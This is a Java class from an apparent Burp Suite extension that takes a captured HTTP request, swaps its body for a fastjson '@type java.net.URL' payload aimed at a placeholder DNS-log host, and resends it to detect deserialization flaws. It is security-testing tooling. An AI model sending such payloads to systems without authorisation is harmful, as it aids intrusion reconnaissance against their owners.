package burp.extension;

import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;

import java.util.Arrays;
import java.util.List;

/**
 * @ClassName: RemoteCmd
 * @Auther: niko
 * @Date: 2025/1/20 17:25
 * @Description:
 */
public class RemoteCmd {
    private IBurpExtenderCallbacks callbacks;

    private IExtensionHelpers helpers;

    private List<String> payloads;

    private IHttpRequestResponse iHttpRequestResponse;

    public RemoteCmd(IBurpExtenderCallbacks callbacks,IHttpRequestResponse iHttpRequestResponse, IExtensionHelpers helpers, List<String> payloads) {
        this.callbacks = callbacks;
        this.helpers = helpers;
        this.payloads = payloads;
        this.iHttpRequestResponse = iHttpRequestResponse;
    }
    public IHttpRequestResponse run(){
        payloads = Arrays.asList("{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog\"}","c");
        byte[] request = iHttpRequestResponse.getRequest();
        IRequestInfo requestInfo = helpers.analyzeRequest(request);
        List<String> headers = requestInfo.getHeaders();
        byte[] bytes = helpers.buildHttpMessage(headers, helpers.stringToBytes(payloads.get(0)));
        return callbacks.makeHttpRequest(iHttpRequestResponse.getHttpService(), bytes);

    }



}
